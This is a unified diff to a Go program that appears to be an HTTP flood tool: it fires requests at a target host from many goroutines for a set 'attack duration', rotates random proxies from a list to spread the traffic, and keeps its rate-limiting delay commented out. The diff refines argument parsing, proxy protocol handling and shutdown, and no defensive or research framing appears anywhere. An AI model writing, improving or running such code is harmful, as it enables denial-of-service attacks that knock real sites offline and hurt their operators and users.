@@ -24,19 +24,26 @@ type errorStats struct {
 }
 
 func main() {
-    if len(os.Args) < 5 {
-        fmt.Println("Usage: ./main <host/url> <threads> <timeout> [<list>] <seconds>")
+    if len(os.Args) < 6 {
+        fmt.Println("Usage: ./script <host/url> <seconds> <threads> <timeout> <list>")
         return
     }
 
     targetHost := os.Args[1]
-    threads, err := strconv.Atoi(os.Args[2])
+
+    attackDurationSeconds, err := strconv.Atoi(os.Args[2])
+    if err != nil {
+        fmt.Println("Error: Invalid duration value")
+        return
+    }
+
+    threads, err := strconv.Atoi(os.Args[3])
     if err != nil {
         fmt.Println("Error: Invalid number of threads")
         return
     }
 
-    timeoutSeconds, err := strconv.Atoi(os.Args[3])
+    timeoutSeconds, err := strconv.Atoi(os.Args[4])
     if err != nil {
         fmt.Println("Error: Invalid timeout value")
         return
@@ -45,7 +52,7 @@ func main() {
 
     var proxyList string
     if len(os.Args) > 5 {
-        proxyList = os.Args[4]
+        proxyList = os.Args[5]
     }
 
     var proxies []string
@@ -59,12 +66,9 @@ func main() {
         }
     }
 
-    // Parse the duration to run the attack
-    attackDurationSeconds, err := strconv.Atoi(os.Args[len(os.Args)-1])
-    if err != nil {
-        fmt.Println("Error: Invalid duration value")
-        return
-    }
+    // Initialize context and cancel function for graceful shutdown
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
 
     // Initialize error statistics tracker
     errorStats := &errorStats{
@@ -74,10 +78,6 @@ func main() {
     // Use channels for successful requests, error reporting, and stop signal
     successfulRequests := make(chan struct{})
     errorReport := make(chan error)
-    stopSignal := make(chan struct{})
-
-    // Context and cancel for graceful shutdown
-    ctx, cancel := context.WithCancel(context.Background())
 
     // Goroutine for printing statistics
     go func() {
@@ -99,11 +99,6 @@ func main() {
                 }
                 errorStats.errorMap[errorCode]++
                 errorStats.mu.Unlock()
-            case <-stopSignal:
-                fmt.Println("\n\nAttack stopped.")
-                printFinalStats(successfulCount, errorStats)
-                cancel() // Cancel context to stop all goroutines
-                return
             case <-ctx.Done():
                 fmt.Println("\n\nContext cancelled. Stopping attack.")
                 printFinalStats(successfulCount, errorStats)
@@ -113,11 +108,9 @@ func main() {
                 if elapsed >= float64(attackDurationSeconds) {
                     fmt.Println("\n\nAttack duration reached.")
                     printFinalStats(successfulCount, errorStats)
-                    cancel() // Cancel context to stop all goroutines
                     return
                 }
                 fmt.Printf("\rSuccessfully sent %d requests", successfulCount)
-                //time.Sleep(1 * time.Second)
             }
         }
     }()
@@ -141,15 +134,15 @@ func main() {
         }()
     }
 
-    // Wait for all goroutines to finish
-    wg.Wait()
+    // Wait for all goroutines to finish or context cancellation
+    go func() {
+        wg.Wait()
+        close(successfulRequests)
+        close(errorReport)
+    }()
 
-    // Close channels after all goroutines finish
-    close(successfulRequests)
-    close(errorReport)
-
-    // Print final statistics
-    //printFinalStats(successfulCount, errorStats)
+    // Block main goroutine until signal is received or attack duration is reached
+    <-ctx.Done()
 }
 
 func loadProxies(filename string) ([]string, error) {
@@ -183,13 +176,21 @@ func sendRequests(ctx context.Context, targetHost string, proxies []string, time
         default:
             var httpClient *http.Client
 
+            // Determine the protocol (http:// or https://)
+            var protocol string
+            if strings.HasPrefix(targetHost, "https://") {
+                protocol = "https"
+            } else {
+                protocol = "http"
+            }
+
             // Use proxy if provided and not empty
             if len(proxies) > 0 {
                 proxy := proxies[rand.Intn(len(proxies))]
                 httpClient = &http.Client{
                     Timeout: timeout,
                     Transport: &http.Transport{
-                        Proxy: http.ProxyURL(makeProxyURL(proxy)),
+                        Proxy: http.ProxyURL(makeProxyURL(proxy, protocol)),
                     },
                 }
             } else {
@@ -227,13 +228,13 @@ func sendRequests(ctx context.Context, targetHost string, proxies []string, time
             }
 
             // Sleep for a while before making the next request
-            //time.Sleep(1 * time.Second)
+            //time.Sleep(time.Second) // Add a delay to avoid flooding the server
         }
     }
 }
 
-func makeProxyURL(proxy string) *url.URL {
-    proxyURL, _ := url.Parse("http://" + proxy)
+func makeProxyURL(proxy string, protocol string) *url.URL {
+    proxyURL, _ := url.Parse(fmt.Sprintf("%s://%s", protocol, proxy))
     return proxyURL
 }
 
@@ -247,4 +248,7 @@ func printFinalStats(successfulCount int, errorStats *errorStats) {
     errorStats.mu.Unlock()
 
     fmt.Printf("Total Requests: %d\n", successfulCount+errorStats.count)
+
+    // Exit the program after printing stats
+    os.Exit(0)
 }
